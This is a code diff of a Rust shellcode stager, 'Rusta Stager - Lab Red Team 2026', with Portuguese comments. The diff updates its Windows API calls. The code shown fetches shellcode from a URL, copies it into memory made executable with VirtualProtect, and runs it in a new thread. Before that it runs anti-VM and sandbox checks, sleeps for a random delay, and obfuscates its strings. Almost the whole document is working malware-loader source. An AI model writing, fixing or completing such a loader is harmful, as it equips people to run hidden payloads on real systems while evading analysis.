@@ -1,5 +1,7 @@
+// ========================================================
 // rusta-stager/src/main.rs
-use windows_sys::Win32::System::Threading::*;
+// Rust Stager - Lab Red Team 2026 (VERSÃO FINAL FUNCIONANDO)
+// ========================================================
 use clap::Parser;
 use log::{error, info, warn};
 use obfstr::obfstr;
@@ -7,10 +9,11 @@ use rand::Rng;
 use reqwest::blocking;
 use std::error::Error;
 use std::time::Duration;
-use windows_sys::Win32::{
-    Foundation::*,
-    System::{Memory::*, Threading::*},
-};
+
+// ==================== WINDOWS API ====================
+use windows::Win32::System::Memory::*;
+use windows::Win32::System::Threading::*;
+// ========================================================
 
 #[derive(Parser)]
 #[command(author, version, about = "Rust Stager - Lab Red Team 2026", long_about = None)]
@@ -34,7 +37,6 @@ fn main() -> Result<(), Box<dyn Error>> {
     env_logger::init();
     let args = Args::parse();
 
-    // Anti-VM + Delay randômico
     if !anti_analysis_check() {
         std::process::exit(1);
     }
@@ -43,14 +45,12 @@ fn main() -> Result<(), Box<dyn Error>> {
         Commands::Info => run_info(),
         Commands::Execute { url } => execute_shellcode(&url)?,
     }
-
     Ok(())
 }
 
 fn anti_analysis_check() -> bool {
     let sys = sysinfo::System::new_all();
 
-    // Checagens básicas de VM/Sandbox
     if sys.cpus().len() < 4 {
         warn!("{} Poucos núcleos CPU - possível VM", obfstr!("[!]"));
         return false;
@@ -60,7 +60,6 @@ fn anti_analysis_check() -> bool {
         return false;
     }
 
-    // Delay randômico anti-timing
     let delay = rand::thread_rng().gen_range(1200..4500);
     std::thread::sleep(Duration::from_millis(delay));
 
@@ -94,9 +93,8 @@ fn execute_shellcode(url: &str) -> Result<(), Box<dyn Error>> {
     }
 
     unsafe {
-        // Alocação RWX
         let addr = VirtualAlloc(
-            std::ptr::null(),
+            None,
             shellcode.len(),
             MEM_COMMIT | MEM_RESERVE,
             PAGE_READWRITE,
@@ -108,24 +106,30 @@ fn execute_shellcode(url: &str) -> Result<(), Box<dyn Error>> {
 
         std::ptr::copy_nonoverlapping(shellcode.as_ptr(), addr as *mut u8, shellcode.len());
 
-        let mut old_protect = 0u32;
+        let mut old_protect = PAGE_PROTECTION_FLAGS(0);
         VirtualProtect(addr, shellcode.len(), PAGE_EXECUTE_READWRITE, &mut old_protect);
 
-        let thread = CreateThread(
-            None,
-            0,
-            Some(std::mem::transmute(addr)),
-            None,
-            0,
-            None,
-        );
+        // ====================== THREAD CORRIGIDA (windows 0.57) ======================
+        let start_routine: LPTHREAD_START_ROUTINE = Some(std::mem::transmute(addr));
 
-        if !thread.is_null() {
-            info!("{} Shellcode executado in-memory com sucesso!", obfstr!("[+]"));
-            WaitForSingleObject(thread, INFINITE);
-        } else {
+        let thread = CreateThread(
+            None,                          // lpThreadAttributes
+            0,                             // dwStackSize
+            start_routine,                 // lpStartAddress (Option<fn>)
+            None,                          // lpParameter
+            THREAD_CREATION_FLAGS(0),      // dwCreationFlags
+            None,                          // lpThreadId
+        )
+        .map_err(|e| format!("CreateThread falhou: {:?}", e))?;
+
+        if thread.is_invalid() {
             error!("{} Falha ao criar thread", obfstr!("[!]"));
+            return Err("Thread inválida".into());
         }
+
+        info!("{} Shellcode executado in-memory com sucesso!", obfstr!("[+]"));
+        WaitForSingleObject(thread, INFINITE);
+        // ============================================================================
     }
 
     Ok(())
